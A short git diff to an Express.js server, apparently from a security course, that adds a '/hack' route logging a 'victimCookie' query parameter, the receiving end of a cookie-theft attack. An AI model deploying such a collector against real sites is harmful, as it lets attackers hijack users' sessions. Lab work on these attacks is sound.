@@ -34,6 +34,15 @@ const corsOptions = {
 // app.use(cors(corsOptions))
 // app.use(cors())
 
+app.get('/hack', (req, res) => {
+    const { victimCookie } = req.query;
+    console.log('Victim Cookie: ', victimCookie);
+    res.status(200).send(JSON.stringify({
+        subject: 'ddss',
+        year: 2019
+    })); 
+})
+
 app.get('/info', (req, res) => {
     res.status(200).send(JSON.stringify({
         subject: 'ddss',
